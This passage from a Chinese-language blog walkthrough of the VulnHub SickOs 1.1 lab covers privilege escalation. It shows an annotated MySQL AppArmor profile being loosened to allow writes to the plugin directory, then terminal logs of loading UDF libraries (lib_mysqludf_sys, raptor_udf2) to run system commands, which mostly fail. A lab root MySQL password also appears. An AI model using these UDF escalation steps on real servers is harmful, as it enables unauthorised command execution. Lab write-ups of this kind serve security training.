无法在此目录下创建或写入文件。</li>
<li><code>/usr/lib/mysql/plugin/*.so* mr,</code> 表示 MySQL
进程被允许读取（<code>r</code>）和映射（<code>m</code>）位于
<code>/usr/lib/mysql/plugin/</code> 目录中的所有 <code>.so</code>
文件。这意味着 MySQL
可以加载这些共享库，但并没有给予对该目录的写入权限。</li>
</ul>
<p><strong><em>附每条规则的注释 - ChatGPT</em></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim:syntax=apparmor</span></span><br><span class="line"><span class="comment"># Last Modified: Tue Jun 19 17:37:30 2007</span></span><br><span class="line"><span class="comment">#include &lt;tunables/global&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 mysqld 进程的 AppArmor 配置</span></span><br><span class="line">/usr/sbin/mysqld &#123;</span><br><span class="line">  <span class="comment"># 包含基础的抽象规则</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/base&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 包含名称服务的抽象规则</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/nameservice&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 包含临时用户目录的抽象规则</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/user-tmp&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 包含 MySQL 的抽象规则</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/mysql&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 包含 Winbind 的抽象规则</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/winbind&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许特定的能力</span></span><br><span class="line">  capability dac_override,  <span class="comment"># 允许覆盖文件权限检查</span></span><br><span class="line">  capability sys_resource,   <span class="comment"># 允许使用系统资源限制</span></span><br><span class="line">  capability setgid,        <span class="comment"># 允许改变进程的 GID</span></span><br><span class="line">  capability setuid,        <span class="comment"># 允许改变进程的 UID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许 TCP 网络访问</span></span><br><span class="line">  network tcp,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取 /etc/hosts.allow 和 /etc/hosts.deny</span></span><br><span class="line">  /etc/hosts.allow r,</span><br><span class="line">  /etc/hosts.deny r,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取 MySQL 证书文件</span></span><br><span class="line">  /etc/mysql/*.pem r,</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 允许读取 MySQL 配置目录及其中的文件</span></span><br><span class="line">  /etc/mysql/conf.d/ r,</span><br><span class="line">  /etc/mysql/conf.d/* r,</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 允许读取 MySQL 主配置文件</span></span><br><span class="line">  /etc/mysql/*.cnf r,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取插件目录和其中的共享库</span></span><br><span class="line">  /usr/lib/mysql/plugin/ r,      <span class="comment"># 允许读取插件目录</span></span><br><span class="line">  /usr/lib/mysql/plugin/*.so* mr, <span class="comment"># 允许读取和映射插件共享库文件</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许访问 MySQL 可执行文件</span></span><br><span class="line">  /usr/sbin/mysqld mr,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取 MySQL 共享文件</span></span><br><span class="line">  /usr/share/mysql/** r,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取和写入 MySQL 日志文件</span></span><br><span class="line">  /var/log/mysql.log rw,</span><br><span class="line">  /var/log/mysql.err rw,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取 MySQL 数据目录及其中的文件</span></span><br><span class="line">  /var/lib/mysql/ r,</span><br><span class="line">  /var/lib/mysql/** rwk,  <span class="comment"># 允许读取和写入数据目录中的所有文件</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取 MySQL 日志目录</span></span><br><span class="line">  /var/log/mysql/ r,</span><br><span class="line">  /var/log/mysql/* rw,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取和写入 MySQL PID 文件</span></span><br><span class="line">  /var/run/mysqld/mysqld.pid rw,</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 允许写入 MySQL socket 文件</span></span><br><span class="line">  /var/run/mysqld/mysqld.sock w,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取和写入 mysqld.socket PID 文件</span></span><br><span class="line">  /run/mysqld/mysqld.pid rw,</span><br><span class="line">  /run/mysqld/mysqld.sock w,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 允许读取系统 CPU 信息</span></span><br><span class="line">  /sys/devices/system/cpu/ r,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 包含特定站点的附加和覆盖规则</span></span><br><span class="line">  <span class="comment">#include &lt;local/usr.sbin.mysqld&gt;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改插件目录的规则，加上写权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/mysql/plugin/ rw,</span><br><span class="line">/usr/lib/mysql/plugin/*.so* mrw,</span><br></pre></td></tr></table></figure>
<p>重新加载，不行的话重启下 MySQL</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@SickOs:/usr/lib/mysql/plugin<span class="comment"># /etc/init.d/apparmor reload</span></span><br><span class="line"> * Reloading AppArmor profiles                                                                                                                                                                                                                                                                                              Skipping profile <span class="keyword">in</span> /etc/apparmor.d/disable: usr.sbin.rsyslogd</span><br><span class="line">                                                                                                                                                                                                                                                                                                                     [ OK ]</span><br><span class="line">root@SickOs:/usr/lib/mysql/plugin<span class="comment"># /etc/init.d/mysql restart</span></span><br><span class="line">Rather than invoking init scripts through /etc/init.d, use the service(8)</span><br><span class="line">utility, e.g. service mysql restart</span><br><span class="line"></span><br><span class="line">Since the script you are attempting to invoke has been converted to an</span><br><span class="line">Upstart job, you may also use the stop(8) and <span class="keyword">then</span> start(8) utilities,</span><br><span class="line">e.g. stop mysql ; start mysql. The restart(8) utility is also available.</span><br><span class="line">mysql stop/waiting</span><br><span class="line">mysql start/running, process 3040</span><br><span class="line">root@SickOs:/usr/lib/mysql/plugin<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>测试，可自定义函数了，但创建的函数却没法正常执行，可能是版本不匹配导致的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">sickos@SickOs:~$ mysql -uroot -pjohn@123</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 52</span><br><span class="line">Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt;  drop table  npn;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create table npn(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into npn values(load_file(<span class="string">&#x27;/tmp/lib_mysqludf_sys_32.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * from npn into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys_32.so&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create <span class="keyword">function</span> sys_exec returns <span class="built_in">integer</span> soname <span class="string">&#x27;lib_mysqludf_sys_32.so&#x27;</span>;</span><br><span class="line">ERROR 1126 (HY000): Can<span class="string">&#x27;t open shared library &#x27;</span>lib_mysqludf_sys_32.so<span class="string">&#x27; (errno: 0 /usr/lib/mysql/plugin/lib_mysqludf_sys_32.so: file too short)</span></span><br><span class="line"><span class="string">mysql&gt; </span></span><br><span class="line"><span class="string">mysql&gt; \! cp /tmp/lib_mysqludf_sys_32.so  /usr/lib/mysql/plugin/</span></span><br><span class="line"><span class="string">mysql&gt; </span></span><br><span class="line"><span class="string">mysql&gt; create function sys_exec returns integer soname &#x27;</span>lib_mysqludf_sys_32.so<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">Query OK, 0 rows affected (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; create function sys_eval returns integer soname &#x27;</span>lib_mysqludf_sys_32.so<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">Query OK, 0 rows affected (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; select * from mysql.func;</span></span><br><span class="line"><span class="string">+----------+-----+------------------------+----------+</span></span><br><span class="line"><span class="string">| name     | ret | dl                     | type     |</span></span><br><span class="line"><span class="string">+----------+-----+------------------------+----------+</span></span><br><span class="line"><span class="string">| sys_exec |   2 | lib_mysqludf_sys_32.so | function |</span></span><br><span class="line"><span class="string">| sys_eval |   2 | lib_mysqludf_sys_32.so | function |</span></span><br><span class="line"><span class="string">+----------+-----+------------------------+----------+</span></span><br><span class="line"><span class="string">2 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; select sys_eval(&#x27;</span><span class="built_in">whoami</span><span class="string">&#x27;);</span></span><br><span class="line"><span class="string">ERROR 2013 (HY000): Lost connection to MySQL server during query</span></span><br><span class="line"><span class="string">mysql&gt; </span></span><br><span class="line"><span class="string">mysql&gt; select sys_eval(&#x27;</span><span class="built_in">whoami</span><span class="string">&#x27;);</span></span><br><span class="line"><span class="string">ERROR 2006 (HY000): MySQL server has gone away</span></span><br><span class="line"><span class="string">No connection. Trying to reconnect...</span></span><br><span class="line"><span class="string">Connection id:    52</span></span><br><span class="line"><span class="string">Current database: mysql</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ERROR 2013 (HY000): Lost connection to MySQL server during query</span></span><br><span class="line"><span class="string">mysql&gt; select sys_eval(&#x27;</span><span class="built_in">whoami</span><span class="string">&#x27;);</span></span><br><span class="line"><span class="string">ERROR 2006 (HY000): MySQL server has gone away</span></span><br><span class="line"><span class="string">No connection. Trying to reconnect...</span></span><br><span class="line"><span class="string">Connection id:    51</span></span><br><span class="line"><span class="string">Current database: mysql</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ERROR 2013 (HY000): Lost connection to MySQL server during query</span></span><br><span class="line"><span class="string">mysql&gt; SELECT sys_exec(&#x27;</span><span class="built_in">ls</span><span class="string">&#x27;);</span></span><br><span class="line"><span class="string">ERROR 2006 (HY000): MySQL server has gone away</span></span><br><span class="line"><span class="string">No connection. Trying to reconnect...</span></span><br><span class="line"><span class="string">Connection id:    51</span></span><br><span class="line"><span class="string">Current database: mysql</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+----------------+</span></span><br><span class="line"><span class="string">| sys_exec(&#x27;</span><span class="built_in">ls</span><span class="string">&#x27;) |</span></span><br><span class="line"><span class="string">+----------------+</span></span><br><span class="line"><span class="string">|          32512 |</span></span><br><span class="line"><span class="string">+----------------+</span></span><br><span class="line"><span class="string">1 row in set (0.01 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; exit</span></span><br><span class="line"><span class="string">Bye</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>又试了几个都未成功，是前面哪个步骤出问题了？</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">sickos@SickOs:~$ mysql -uroot -pjohn@123</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 52</span><br><span class="line">Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/sickos/raptor_udf2.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line">ERROR 1126 (HY000): Can<span class="string">&#x27;t open shared library &#x27;</span>raptor_udf2.so<span class="string">&#x27; (errno: 0 /usr/lib/mysql/plugin/raptor_udf2.so: file too short)</span></span><br><span class="line"><span class="string">mysql&gt;</span></span><br><span class="line"><span class="string">mysql&gt; \! cp /home/sickos/raptor_udf2.so /usr/lib/mysql/plugin</span></span><br><span class="line"><span class="string">mysql&gt;</span></span><br><span class="line"><span class="string">mysql&gt; create function do_system returns integer soname &#x27;</span>raptor_udf2.so<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">Query OK, 0 rows affected (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; select * from mysql.func;</span></span><br><span class="line"><span class="string">+-----------+-----+------------------------+----------+</span></span><br><span class="line"><span class="string">| name      | ret | dl                     | type     |</span></span><br><span class="line"><span class="string">+-----------+-----+------------------------+----------+</span></span><br><span class="line"><span class="string">| sys_exec  |   2 | lib_mysqludf_sys_32.so | function |</span></span><br><span class="line"><span class="string">| sys_eval  |   0 | udf_32.so              | function |</span></span><br><span class="line"><span class="string">| do_system |   2 | raptor_udf2.so         | function |</span></span><br><span class="line"><span class="string">+-----------+-----+------------------------+----------+</span></span><br><span class="line"><span class="string">3 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; select do_system(&#x27;</span><span class="built_in">id</span> &gt; /tmp/out; <span class="built_in">chown</span> raptor.raptor /tmp/out<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">+----------------------------------------------------------+</span></span><br><span class="line"><span class="string">| do_system(&#x27;</span><span class="built_in">id</span> &gt; /tmp/out; <span class="built_in">chown</span> raptor.raptor /tmp/out<span class="string">&#x27;) |</span></span><br><span class="line"><span class="string">+----------------------------------------------------------+</span></span><br><span class="line"><span class="string">|                                          139637976727552 |</span></span><br><span class="line"><span class="string">+----------------------------------------------------------+</span></span><br><span class="line"><span class="string">1 row in set (0.01 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql&gt; \! sh</span></span><br><span class="line"><span class="string">$ ls -al /tmp</span></span><br><span class="line"><span class="string">total 8</span></span><br><span class="line"><span class="string">drwxrwxrwt  2 root root 4096 Oct 19 15:46 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 22 root root 4096 Sep 22  2015 ..</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">$ cat /tmp/out</span></span><br><span class="line"><span class="string">cat: /tmp/out: No such file or directory</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">$ exit</span></span><br><span class="line"><span class="string">mysql&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="dirtycow-提权">3.5. DirtyCow 提权</h3>
<ul>
<li>参见：<a
target="_blank" rel="noopener" href="https://www.sevenlayers.com/index.php/85-vulnhub-sickos-1-1-walkthrough">Vulnhub
SickOs: 1.1 Walkthrough</a></li>
</ul>
<h2 id="参考">4. 参考</h2>
<ul>
<li><a
target="_blank" rel="noopener" href="https://www.sevenlayers.com/index.php/85-vulnhub-sickos-1-1-walkthrough">Vulnhub
SickOs: 1.1 Walkthrough</a><br />
</li>
<li><a target="_blank" rel="noopener" href="https://jhalon.github.io/vulnhub-sick-os1/">VulnHub
‘SickOS: 1.1’ - CTF - Jack Hacks</a><br />
</li>
<li><a
target="_blank" rel="noopener" href="https://blog.csdn.net/duxu24/article/details/53669697">MySQL into
outfile 问题解决：ERROR 1 (HY000): Can't create/write to file_into
outfile 报错-CSDN博客</a><br />
</li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kqdssheng/p/18254942">Linux
提权-MySQL UDF - 扛枪的书生 - 博客园</a><br />
</li>
<li><a
target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/network-services-pentesting/pentesting-mysql#quan-xian-ti-sheng">3306
- Pentesting Mysql | HackTricks</a><br />
</li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">MySQL 4.x/5.0
(Linux) - User-Defined Function (UDF) Dynamic Library (2) - Linux local
Exploit</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>z9m8r8
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://z9m8r8.github.io/2024/10/19/SickOs%201.1/" title="VulnHub - SickOs: 1.1">https://z9m8r8.github.io/2024/10/19/SickOs 1.1/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
              <a href="/tags/Insecure-File-Upload/" rel="tag"><i class="fa fa-tag"></i> Insecure File Upload</a>
              <a href="/tags/Crontab/" rel="tag"><i class="fa fa-tag"></i> Crontab</a>
              <a href="/tags/Dirty-COW/" rel="tag"><i class="fa fa-tag"></i> Dirty COW</a>
              <a href="/tags/MySQL-Getshell/" rel="tag"><i class="fa fa-tag"></i> MySQL & Getshell</a>
              <a href="/tags/3128-Squid/" rel="tag"><i class="fa fa-tag"></i> 3128 & Squid</a>
              <a href="/tags/CGI/" rel="tag"><i class="fa fa-tag"></i> CGI</a>
              <a href="/tags/Shellshock/" rel="tag"><i class="fa fa-tag"></i> Shellshock</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/10/17/HackMyVM%20-%20Liar/" rel="prev" title="HackMyVM - Liar">
                  <i class="fa fa-angle-left"></i> HackMyVM - Liar
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/10/28/HackMyVM%20-%20Simple/" rel="next" title="HackMyVM - Simple">
                  HackMyVM - Simple <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">z9m8r8</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">361k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">21:53</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
